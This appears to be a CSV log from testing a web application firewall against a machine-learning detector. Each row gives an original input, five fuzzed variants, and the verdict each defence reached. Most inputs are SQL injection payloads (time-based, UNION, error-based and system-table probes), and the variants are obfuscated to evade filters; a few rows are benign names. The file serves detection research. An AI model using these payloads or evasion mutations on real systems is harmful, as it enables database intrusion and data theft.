Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
24,2024-12-16T17:55:30.533341, (  select   (  case when   (  7018  =  7018  )   then 7018 else 7018*  (  select 7018 from master..sysdatabases  )   end   )    ) ,403,403,200,waf_correct_ml_incorrect," (  seLEcT   (  CASe WhEN   (  8280 In (8279,8280,8281)
 /*QA*/likE   7018  )   thEN (sEleCT 7018) eLSe  Or 0*  (  seLeCT 7018 From master..sysdatabases  )   eND   )    ) ",2024-12-16T17:55:36.901229,403,200,waf_correct_ml_incorrect," (  seleCT   (  cAse whEn   (  8280 In ((SELECT 8279), And 1,8281)  /*QA*/LIke   7018  )   theN (selEcT 7018) ELse  Or 0*  (  SElecT '|j;' LIKE '|j;' FrOm/**/master..sysdatabases  )   end   )    ) ",2024-12-16T17:55:45.826503,403,200,waf_correct_ml_incorrect," (  SELeCt   (  cASE wHEn   (  8280 iN ((SeLeCt 8279), aND 1,8281)  /**/LIKE    && (SelEcT 1)  )   THen (sElECt 7018) Else  oR 2405 NOT LIKE 2406*  (  SeLEct '|j;'	LIke '|j;' FRoM master..sysdatabases  )   END   )    ) ",2024-12-16T17:55:55.832047,403,200,waf_correct_ml_incorrect," (  sElect   (  CasE whEN   (  'e*y'!='e*y3' In ((selECt 8279), and 1,8281)   LiKe    && (SeLecT 0x1)  )   thEN (selECT 7018) ElSE  oR 2405 NOT LIKE (SELECt 1)*  (  sElECT '|j;' LiKE '|j;' from master..sysdatabases  )   eNd   )    ) ",2024-12-16T17:56:07.232536,403,200,waf_correct_ml_incorrect," (  sElEcT   (  CASE WHen   (  'e*y'!='e*y3' In ((Select/**/8852<> OR 0), AND 1,8281)
  liKE     ANd  (SELECt 0x1)  )   theN (sELECT 0x1b6a) elSe  Or 2405 NOT LIKE (SElEcT 1)*  (  SelEcT '|j;' lIke '|j;' FrOm master..sysdatabases  )   ENd   )    ) ",2024-12-16T17:56:19.020239,403,403,both_correct
25,2024-12-16T17:56:31.577147,alegra,200,200,200,both_correct,alegra,2024-12-16T17:56:31.981875,200,200,both_correct,alegra,2024-12-16T17:56:33.387458,200,200,both_correct,alegra,2024-12-16T17:56:34.792812,200,200,both_correct,alegra,2024-12-16T17:56:36.197968,200,200,both_correct,alegra,2024-12-16T17:56:37.604294,200,200,both_correct
26,2024-12-16T17:56:39.030999,"1""   )    )    as fhlg where 1004  =  1004 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",403,403,200,waf_correct_ml_incorrect,"1""   )    )    AS fhlg wHERE 1004  =  1004 And 'I\'='I\'  =  cast   (    (   chr  (  113  )   Or chr  (  113  )  ||chr  (   ANd 1  )  ||chr  (  106  )  ||chr  (  113  	)    )   ||  (  sELEcT   (  case WhEN   (  0xb25  =  2853  )   then 1 ELSe 0 enD   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )   /**/)    as numeric  )  --",2024-12-16T17:56:56.765963,403,200,waf_correct_ml_incorrect,"1""   )    )    AS fhlg WHeRE 8572<>8573  =  1004 And 'I\'='I\'   LIKE   cast   (    (   chr  (  113  )   Or chr  (  113  )  ||chr  (   AnD 1  )  ||chr  (  106  )  ||chr  (  0x71   )    )   ||  (  seLeCt   (  caSe WhEn   (  0xb25  =  2853  )   thEN  AND 1 elSE 0 eND   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    AS numeric  )  --",2024-12-16T17:57:15.753476,403,200,waf_correct_ml_incorrect,"1""   )    )    AS fhlg wHere 8572<>8573   lIKE   0x3ec aNd 'I\'='I\'   LIKE   cast   (    (   chr  (  113  )   Or chr  (  113  )  ||chr  (   AnD 1  )  ||chr  (  106  )  ||chr  (  0x71   )    )   ||  (  seLeCt   (  caSe WhEn   (/*a-[(*/ 0xb25  =  2853  )   thEN  AND 'h_' NOT LIKE 'h_+' ElsE 0 eNd   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (   OR 0  )  ||chr
 (  122  )  ||chr  (  113   )    )    As numeric  )  --",2024-12-16T17:57:35.716114,403,200,waf_correct_ml_incorrect,"1""   )    )    AS fhlg wHERe (sEleCt 8572)<>8573   lIkE   0x3ec AND 'I\'='I\'   LIKE   cast   (  /**/ (   chr  (  'J'<>'Jj'  )   Or chr  (  (SELECT 1)  )  ||chr  (   AnD 1  )  ||chr  (  106  )  ||chr  (  0x71   )    )   ||  (  seLeCt   (  caSe WhEn   (/*a-[(*/ 0xb25  =  2853  )   thEN  AND 'h_' NOT LIKE 'h_+' ELsE 0 ENd   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )   OR chr  (   OR 0  )  ||chr
 (  122  )  ||chr  (  113  	)    )    AS numeric  )  --",2024-12-16T17:57:56.984189,403,200,waf_correct_ml_incorrect,"1""   )    )    AS fhlg whErE (SELEcT 8572)<>8573   lIkE   0x3ec && 'I\'='I\'   LIKE   cast   (  /**/ (   chr  (  'J'<>'Jj'  )   Or chr  (  (SELECT 1)  )  ||chr  (   AnD 1  )  ||chr  (  106  )  ||chr  (  0x71   )    )   ||  (  seLeCt   (  caSe WhEn   (/*a-[(*/ 0xb25  =   OR 0/**/ )   thEN  AND 'h_' NOT LIKE 'h_+' ELsE 0 ENd   )    )   ::text||  (  chr  (  113  )  ||chr  (  '^Yg:8'!='^Yg:8Q'  )   Or chr  (   Or 0x0  )  ||chr	 (  122  )  ||chr  (  113  	)    )    aS numeric  )  --",2024-12-16T17:58:19.485348,403,200,waf_correct_ml_incorrect
27,2024-12-16T17:58:43.302550,"-4319""  )   where 7534  =  7534 or 8246  =  3217",403,403,403,both_correct,"-(sELECT 4319)"" 
)   WheRe 7534  =  'r7'<>'r7D' or 8246  = /**/ oR 0",2024-12-16T17:58:45.598847,403,200,waf_correct_ml_incorrect,"-(seleCt (SELECT 1))"" 
)   whERE (SELECT '}' LIKE '}')  =
 'r7' not like 'r7D' or 8246  =   oR 0",2024-12-16T17:58:49.823783,403,403,both_correct,"-(selEcT (SELect ';}#'!=';}#J'))"" 
)   wheRE (seLecT '}' Like '}')  =
 'r7'/*i*/not like 'r7D' or (SELECT 8246)  =  	oR  AND 1",2024-12-16T17:58:55.621594,403,403,both_correct,"-(seleCT (selECT ';}#'!=';}#J'))"" 
)   WheRE (SelECt '}' liKE '}')  =	 'r7'/**/not like 'r7D' Or (SElect 5298 iN (0x14b1,5298,5299)) /**/ LIKE   	OR  aNd (SeLEct 1)",2024-12-16T17:59:02.565243,403,200,waf_correct_ml_incorrect,"-(sELECT (sELeCT ';}#'!=';}#J'))""  )   WHErE (seleCT '}' lIke '}')   LIKE 	 'r7' not like 'r7D' oR (SELect 5298 iN (0x14b1,5298,(SELECT 1)=0x1179)) /**/ lIKe   	oR  and (SEleCt 1)",2024-12-16T17:59:11.275642,403,403,both_correct
28,2024-12-16T17:59:20.981451,"-1490'||  (  select 'uzbm' from dual where 3181  =  3181 union all select 3181,3181,3181,3181,3181--",403,403,403,both_correct,"-1490'||  (  select 'uzbm'
from dual where (SELECT 'q'<>'qY') /**/ LiKe   3181 union all SEleCT 3181,0xc6d,3181,3181,3181--",2024-12-16T17:59:25.773599,403,403,both_correct,"-1490'||  (  select 'uzbm' from dual where (SELECT 'q'<>'qY')   LiKe   '\'!='\>' union all SELeCt 3181,0xc6d, and 1,3181,(SELECT 3181)--",2024-12-16T17:59:32.607934,403,403,both_correct,"-4919 NOT LIKE 4920'||  (  select 'uzbm' from dual where (SELECT/**/'q'<>'qY')   LiKe   '\'!='\>' union all SelEct	 Or 0,0xc6d, aNd 1,3181,(SElECt 0xc6d)--",2024-12-16T17:59:39.917279,403,403,both_correct,"-0x1337
not like 4920'||  (  select 'uzbm' from/**/dual where (SELECT/*|*/'q'<>'qY')   LiKe   '\'!='\>' union all SelEct	 Or (SELECT 1),0xc6d, aNd 'x'='x',3181,(SEleCt 0xc6d)--",2024-12-16T17:59:48.428991,403,403,both_correct,"-0x1337	not like 1006 like  OR 0'||  (  select 'uzbm' from/**/dual where (SELECT/*|*/'q'<>'qY')   LiKe   '\'!='\>' union all SelEct	 Or (SELECT 0x1),0xc6d, aNd/*i{c2*/'x'='x',3181,(SeLEcT 0xc6d)--",2024-12-16T17:59:57.596595,403,403,both_correct
29,2024-12-16T18:00:07.931062,"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",403,403,200,waf_correct_ml_incorrect,"0x1   )    )     )   anD 3824  =  benchmark  (  5000000,md5 /**/(  0x76555642   )	   )    ANd    (    (     (  '}' LIKE '}'   LIKE   (SELeCT 1)",2024-12-16T18:00:13.850753,403,200,waf_correct_ml_incorrect,"0x1   )    )     )   aND (SelEct '.' LIKe '.')   LIKE   benchmark  (  0x4c4b40,md5  (  0x76555642   )    )    aNd    (    (     (  '}' lIKE '}'   lIKE   (seleCt 1)",2024-12-16T18:00:21.460505,403,200,waf_correct_ml_incorrect,"0x1   )    )     )   aND (sELecT '.' lIKE '.')   LIKe   benchmark  (  0x4c4b40,md5  ( /**/0x76555642   )    )    And    (   	(     (  '}' likE '}'   lIKe   (sELEct  || '0x5'<>'56')",2024-12-16T18:00:30.132098,403,200,waf_correct_ml_incorrect,"0x1   )    )     )   And (SeLecT '.' LikE '.')   Like   benchmark  (  0x4c4b40,md5  ( /*8|}fk*/0x76555642   )    )    anD    (  /**/
(     (  '}' liKe '}'   lIKE   (SeLEcT  || '0x5' NOT LIKE '(SELECT 0x1817 IN (6166,6167,6168))')",2024-12-16T18:00:39.795131,403,200,waf_correct_ml_incorrect,"0x1   )    )     )   and (SelEct '.' lIKe '.')   liKE   benchmark  (  0x4c4b40,md5  (
/*8|}fk*/0x76555642   )    )    And    (   
(     (  '}' like '}'   LIKE   (SeleCT  || '0x5' not like '(SELECT 0x1817 IN (6166, OR '0\/r' NOT LIKE '0\/r@',(SELECT 6168)))')",2024-12-16T18:00:51.407352,403,403,both_correct
30,2024-12-16T18:01:04.727636,tiedeman,200,200,200,both_correct,tiedeman,2024-12-16T18:01:05.251452,200,200,both_correct,tiedeman,2024-12-16T18:01:06.757938,200,200,both_correct,tiedeman,2024-12-16T18:01:08.262491,200,200,both_correct,tiedeman,2024-12-16T18:01:09.759883,200,200,both_correct,tiedeman,2024-12-16T18:01:11.257599,200,200,both_correct
31,2024-12-16T18:01:12.746330,guntekin,200,200,200,both_correct,guntekin,2024-12-16T18:01:13.251640,200,200,both_correct,guntekin,2024-12-16T18:01:14.731125,200,200,both_correct,guntekin,2024-12-16T18:01:16.237903,200,200,both_correct,guntekin,2024-12-16T18:01:17.731774,200,200,both_correct,guntekin,2024-12-16T18:01:19.233460,200,200,both_correct
32,2024-12-16T18:01:20.724593,"-7808""   )    )    as jgkk where 9230  =  9230 or elt  (  1032  =  1032,3623  )  --",403,403,200,waf_correct_ml_incorrect,"-7808""   )    ) 	  As jgkk wHeRe 0x240e   like   9230 Or elt  (  1032  = /**/(SELECT 1),9507 IN (9506,9507,9508)  )  --",2024-12-16T18:01:24.694381,403,403,both_correct,"-7808""   )    ) 	  as jgkk wHeRE 0x240e   liKe   0x240e Or elt  (   oR 0   LIKE	  (selEcT 1),9507 in (9506,9321 LIKE 9321,9508)  )  --",2024-12-16T18:01:31.339574,403,200,waf_correct_ml_incorrect,"-0x1e80""   ) /**/  ) 	 
AS jgkk WhErE 0x240e   LiKE   0x240e Or elt  (   or (sELEct 1)   likE	  (SELEcT 1),9507 iN (9506,'9$	S'<>'9$	SS' LIke 9321,9508)  )  --",2024-12-16T18:01:38.885663,403,200,waf_correct_ml_incorrect,"-0x1e80""   ) /**/  ) 	 
aS jgkk WhERE 0x240e   lIkE 	 0x240e oR elt  (/**/  OR (sELecT 1)   LiKE	  (sElEcT 1), or 0 in (9506,'5717 IN (5716,5717,5718)$	S'<>'(SELECT 9)$	SS' LiKe 9321,9508)  )  --",2024-12-16T18:01:47.373534,403,403,both_correct,"-0x1e80""   ) /**/  ) 	 	aS jgkk WheRE 0x240e   LIKe 	 0x240e or elt  (   OR (SElECT 3831!=3832)   like	  (seLeCt  OR 0), oR 0 In (9506,'5717 IN (5716,0x1655,5718)$	S'<>'(SELECT 9)$	SS' likE 9321,9508)  )  --",2024-12-16T18:01:57.583432,403,403,both_correct
33,2024-12-16T18:02:08.506570,4.81564E+15,200,200,403,waf_correct_ml_incorrect,'W'S' LIKE/**/'W'S'.81564E+(SELECt	(SELECT 1)),2024-12-16T18:02:09.149926,200,403,waf_correct_ml_incorrect,"'W'S' LIKE
'W'S'.81564E+(sELecT	(seLect '>' LiKE '>'))",2024-12-16T18:02:12.371510,200,403,waf_correct_ml_incorrect,"'W'S' LIKE
'W'S'.81564E+(selEct	(selECT/**/'>'
LIKe '>'))",2024-12-16T18:02:15.977240,200,200,both_correct,"'W'S' LIKE
'W'S'.81564E+(sElECt
(sElecT/**/'>'
LIKE/**/'>'))",2024-12-16T18:02:19.706449,403,200,waf_incorrect_ml_correct,"'W'S' LIKE
'W'S'.81564E+(sELecT
(SElECt '>' liKe/**/'>'))",2024-12-16T18:02:23.588998,403,403,both_incorrect
34,2024-12-16T18:02:27.326187,15142,200,200,403,waf_correct_ml_incorrect,(SELECT/**/(SELECT 9610 NOT LIKE 9611)),2024-12-16T18:02:27.709883,403,403,both_incorrect,"(SeLECT (SElECt 'y'!='yH' not
like 0x258b))",2024-12-16T18:02:30.850057,403,403,both_incorrect,(sELECt/**/(sElecT 'y' NOT LIKE 'yH' not	like 0x258b)),2024-12-16T18:02:34.039812,403,200,waf_incorrect_ml_correct,"(SeLECt/**/(SelEct 'y' not like/*:g*/'yH' not
like 0x258b))",2024-12-16T18:02:37.642350,403,200,waf_incorrect_ml_correct,(SeLEct/**/(Select 'y' not/**/like/*S*/'yH' not	like 0x258b)),2024-12-16T18:02:41.492797,403,200,waf_incorrect_ml_correct
35,2024-12-16T18:02:45.448764,2637,200,200,403,waf_correct_ml_incorrect,"(seLeCT
0x1)",2024-12-16T18:02:45.773929,403,200,waf_incorrect_ml_correct,(sElECT/**/0x1),2024-12-16T18:02:47.457260,403,200,waf_incorrect_ml_correct,(seLeCt 0x1),2024-12-16T18:02:49.286995,403,200,waf_incorrect_ml_correct,(SELeCT/*!N/*/0x1),2024-12-16T18:02:50.974134,403,403,both_incorrect,(sELeCT/*!N/*/0x1),2024-12-16T18:02:52.941089,403,200,waf_incorrect_ml_correct
36,2024-12-16T18:02:54.887628,select sleep  (  5  )  -- waln,403,403,200,waf_correct_ml_incorrect,"selEct/**/sleep  (  (SELECT (SELECT 9074 IN (9073,9074,9075)))
 )  -- waln2",2024-12-16T18:02:56.414094,403,403,both_correct,"SElECt/**/sleep/**/ (  (SElECT (seleCt (SELECT 9074) iN (9073,9074,(SELECT 1) NOT LIKE 300)))
	)  -- waln2q",2024-12-16T18:03:01.020285,403,403,both_correct,"sElect/*Ii*/sleep/**/ (  (SelEct/**/(seLeCt (SELect 9074) In (0x2371, AND 1 lIKe 5433,(SElEct 1) not like 300)))
 )  -- waln2q",2024-12-16T18:03:07.393665,403,200,waf_correct_ml_incorrect,"SElecT/**/sleep  (  (SELeCt/**/(SeLEct (SeleCT ']l(' not like ']l(o') In (0x2371,	anD 0x1 LIKE 5433,(SeleCT (SEleCT 1)) not like 300)))
 )  -- waln2q6",2024-12-16T18:03:14.426242,403,200,waf_correct_ml_incorrect,"SElect/**/sleep  (  (sELeCt (sELeCT (sEleCT ']l(' not like ']l(o') IN (0x2371,	ANd 0x1 LIke  or (SELeCT 0) LIKE 845,(seLecT (sELEcT 1)) not	like 300)))
 )  -- waln2q6y",2024-12-16T18:03:22.462068,403,403,both_correct
37,2024-12-16T18:03:31.611571,5425,200,200,200,both_correct," and (SELECT 3842 NOT
LIKE 3843)",2024-12-16T18:03:31.933423,200,403,waf_correct_ml_incorrect, And (SELEcT 3842/*Y}*/NOT	LIKE  and 439 not like (SELECT 440)),2024-12-16T18:03:34.549845,200,403,waf_correct_ml_incorrect, and (SelecT (SelEct 3842)/**/NOT	LIKE  anD 3701 not like 3702 not	like/**/(select (SELECT 1))),2024-12-16T18:03:38.582664,200,200,both_correct," and (sELect (SEleCt 3842)/**/NOT	LIKE 
AND (sELECt  anD 1) not like 1849 not like 1850 not	like (seLEct (sElEcT 1)))",2024-12-16T18:03:44.122444,200,403,waf_correct_ml_incorrect," AND (selECT (Select 3842)/**/NOT	LIKE 
AND (seleCt  anD  oR 0) not like 0x739	not like 1850 not	like (sElEcT (sELeCT/**/'q'<>'q+')))",2024-12-16T18:03:50.579053,200,403,waf_correct_ml_incorrect
38,2024-12-16T18:03:57.714305,"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""mbas""  =  ""mbas",403,403,200,waf_correct_ml_incorrect,"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr /**/(  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (   OR 0  )  ||chr  (  122  ) 	||chr  (  (SELECT 118)  )  ||chr  (  122  )  ||chr  (  971 IN (970,971,972)   )    )    as numeric  )   and ""mbas""  =  ""mbas",2024-12-16T18:04:14.271177,403,200,waf_correct_ml_incorrect,"'#' not like '#g'""	and 2853  =  cast   (    (   chr  (  113  )  ||chr /* */(  113  )  ||chr  (  112  )  ||chr  (  0x6a  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then  OR 0 else 0 end   )    )/**/  ::text||  (  chr  (   OR 0  )  ||chr  (  122  ) 	||chr  (  (SELECT 118)  )  ||chr  (  122  )  ||chr  (  971 IN (970,971,972)   )    )    as numeric  )   and ""mbas""  =  ""mbas",2024-12-16T18:04:33.229252,403,200,waf_correct_ml_incorrect,"'#' not like '#g'""	and
2853  =  cast   (    (   chr  (  3134!=3135  )  ||chr /**/(  113  )  ||chr  (  112  )  ||chr  (  0x6a  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then  OR 0 else 0 end   )    )/**/  ::text||  (  chr  (   OR 0  ) /**/||chr  (  (SELECT 1)  ) 	||chr  (  (SELECT 118)  )  ||chr  (  122  )  ||chr  (  971 IN (0x3ca,971,972)   )    )    as numeric  )   and ""mbas""  =  ""mbasY",2024-12-16T18:04:53.374130,403,200,waf_correct_ml_incorrect,"'#' not like '#g'""	and 2853  =  cast   (    (   chr  (  3134!=3135  )  ||chr /**/(  (SELECT 113)  )  ||chr  (  112  )  ||chr  (  0x6a  )  ||chr  (  '>_' LIKE '>_'   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then  OR (SELECT 1) else/**/0 end   )    )/*-$""z6*/  ::text||  (  chr  (   OR 0  ) /**/||chr  (  (SELECT 1)  ) 	||chr  (  (SELECT 118)  )  ||chr  (  122  )  ||chr  (  971 IN (0x3ca,971,972)   )    )    as numeric  )   and ""mbas""  =  ""mbasY",2024-12-16T18:05:14.525088,403,200,waf_correct_ml_incorrect,"'#' not like '#g'""	and 'r' NOT LIKE 'r0'  =  cast   (    (   chr  (  3134!=(SELECT 1)  )  ||chr /**/(  (SELECT 113)  )  ||chr  (  112  )  ||chr  (  0x6a /**/)  ||chr  (  '>_' LIKE '>_'   )    )   ||  (  select   ( 	case when   (  2853  =  2853  )   then  OR (SELECT 1) else/**/0 end   )    )/*-$""z6*/  ::text||  (  chr  (   oR 0  ) /**/||chr  (  (sElEct 1)  ) 	||chr  (  (SELECT 118)  )   oR chr  (  122  )  ||chr  (  971 In (0x3ca,0x3cb,972)   )    )    AS numeric  )   AnD ""mbas""  =  ""mbasYb",2024-12-16T18:05:37.480053,403,200,waf_correct_ml_incorrect
39,2024-12-16T18:06:01.677158,"c/ rafael belmonte garcia, 29,",200,200,200,both_correct,"c/
rafael belmonte/**/garcia, 0x1d,",2024-12-16T18:06:03.140511,200,200,both_correct,"c/	rafael belmonte garcia, 0x1d,",2024-12-16T18:06:05.883619,200,200,both_correct,"c/	rafael	belmonte garcia,/**/0x1d,",2024-12-16T18:06:08.521810,200,200,both_correct,"c/	rafael	belmonte
garcia, 0x1d,",2024-12-16T18:06:11.259332,200,200,both_correct,"c/	rafael	belmonte garcia,/**/0x1d,",2024-12-16T18:06:13.845178,200,200,both_correct
40,2024-12-16T18:06:16.574014,godayol iafrate,200,200,200,both_correct,godayol	iafrate,2024-12-16T18:06:17.410246,200,200,both_correct,godayol iafrate,2024-12-16T18:06:19.229638,200,200,both_correct,"godayol
iafrate",2024-12-16T18:06:21.071298,200,200,both_correct,godayol	iafrate,2024-12-16T18:06:22.894875,200,200,both_correct,godayol/**/iafrate,2024-12-16T18:06:24.734483,200,200,both_correct
41,2024-12-16T18:06:26.676091,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",403,403,403,both_correct,"1"" OR 954 Like 0x3ba 	=    (  SelEct 6793 FrOm pg_sleep  (   OR 0  /**/)    )   ",2024-12-16T18:06:29.755317,403,200,waf_correct_ml_incorrect,"(SELECT 1)"" OR 954 lIKE 0x3ba 	=    (  selEcT 7913 iN ( OR 0,7913,7914) FroM pg_sleep  (	  Or 0   )    )   ",2024-12-16T18:06:34.549362,403,403,both_correct,"(seLECt  OR 0)"" oR 0x3ba lIKE 0x3ba 	=    (
 SelECT 7913 iN ( or 0,7913,7914) fRoM pg_sleep  (	  Or 7913 likE 7913   )    ) /*0\Rv0*/ ",2024-12-16T18:06:40.478082,403,200,waf_correct_ml_incorrect,"(seLect  or '' like '')"" or 0x3ba LIke 0x3ba 
=    (
 seLEcT 7913 iN ( oR 0,7913, Or 0x0) fRom pg_sleep  (	  oR 7913 LiKE 7913   )    )   ",2024-12-16T18:06:47.791081,403,200,waf_correct_ml_incorrect,"(sElect  OR '' Like '')"" or 0x3ba likE 0x3ba 
 LIKe	    (
 SElecT 7913 iN/**/( Or 0,'U'!='U^', OR 0x0) froM pg_sleep  (	  OR (SELECT 7913) LIKe  AND 1   )    )   ",2024-12-16T18:06:55.396481,403,403,both_correct
42,2024-12-16T18:07:04.238113,43896,200,200,403,waf_correct_ml_incorrect,0xab78,2024-12-16T18:07:04.594384,200,200,both_correct,0xab78,2024-12-16T18:07:05.965362,200,200,both_correct,0xab78,2024-12-16T18:07:07.373957,200,200,both_correct,0xab78,2024-12-16T18:07:08.772595,200,200,both_correct,0xab78,2024-12-16T18:07:10.172309,200,200,both_correct
43,2024-12-16T18:07:11.583145,"-9054""  )   as rgyu where 3792  =  3792 order by 1--",403,403,403,both_correct,"-(SELECT 1)""  )   AS rgyu/**/wHere 0xed0   LIKe  	'i'!='iw' order by 1--",2024-12-16T18:07:14.121673,403,403,both_correct,"-(sELEcT (SEleCT 1))""  )   As rgyu/*}*/whERe 0xed0   lIkE  	'i' NOT LIKE 'iw' order
by/**/(seleCt 'U' NOT LIKE 'U]')--",2024-12-16T18:07:18.589727,403,403,both_correct,"-(sELeCT (sEleCt 0x1))""  )   As rgyu wherE 0xed0   LIke  	'i' not like 'iw' order by/*l+*x*/(sElEct 'U' NOT LIKE 'U]')--",2024-12-16T18:07:25.089655,403,403,both_correct,"-(sEleCt (SElEcT 0x1))""  )   as rgyu wHERe 0xed0   like  	'i' not like/**/'iw' order by/*l+*x*/(sElEcT 'U' not like	'U]')--",2024-12-16T18:07:32.049333,403,200,waf_correct_ml_incorrect,"-(SelEct (SElECT 0x1))""  )   aS rgyu WheRE 0xed0   likE  
'i' not like 'iw' order by/*l+*x*/(SelECT 'U' not like	'U]')--",2024-12-16T18:07:38.906544,403,200,waf_correct_ml_incorrect
44,2024-12-16T18:07:45.596526,select   (  case when   (  3486  =  6373  )   then 3486 else 3486*  (  select 3486 from mysql.db  )   end  )  #,403,403,403,both_correct,"sELeCt  /**/(  cASe WHEn   (  3486   LiKE   (SeLeCt 3994!=3995)  )
  tHen 0xd9e Else 3486*  (  SElECT 3486 fRoM mysql.db  )   end  )  #
",2024-12-16T18:07:50.860544,403,200,waf_correct_ml_incorrect,"SeleCT  /**/(  CASE WHEN   (   OR 0 	 LIKE   (SELect (SELECT 3994) not like 3995)  )
  ThEN 0xd9e ELSe '6'<>'6+'*  (  SelEcT 3486 From mysql.db  )   ENd/*%&*/ )  #
",2024-12-16T18:07:58.626756,403,403,both_correct,"SELecT   (  CASe WhEN   (   oR 0 	 lIKe   (SElecT (seLeCt 3994) not like 3995) 
)
  THEN 0xd9e eLSE '6'<>'(SELECT (SELECT 1))+'*  (  seLECt 8407 NOT LIKE 8408 fRoM mysql.db  )   eND/*E*/ )  #
",2024-12-16T18:08:07.492927,403,403,both_correct,"SELEcT   (  CaSE wheN   (   oR 0x0 	 Like   (SElECT (SeLEcT  ANd 1) not like 3995) 
)   thEN 0xd9e eLsE ''9!'!='9!9'' NOT LIKE '(SELECT (SELECT/**/1))+'*  (  SElEcT 8407 NOT LIKE 8408 fRoM mysql.db  )   end/*j5!l*/ )  #
",2024-12-16T18:08:17.459256,403,403,both_correct,"selEcT   (  caSe WheN   (   OR 0x0 	 liKe   (SELECt (SELect  AnD (seLecT 1)) not like 1259<>1260) 
)   ThEn 0xd9e Else ''9!'!='9!9'' not like '(SELECT (SELECT 1))+'*  ( 	SeLEcT 0x20d7 NOT LIKE 8408 fRoM mysql.db  )   EnD/**/ )  #
",2024-12-16T18:08:28.986559,403,403,both_correct
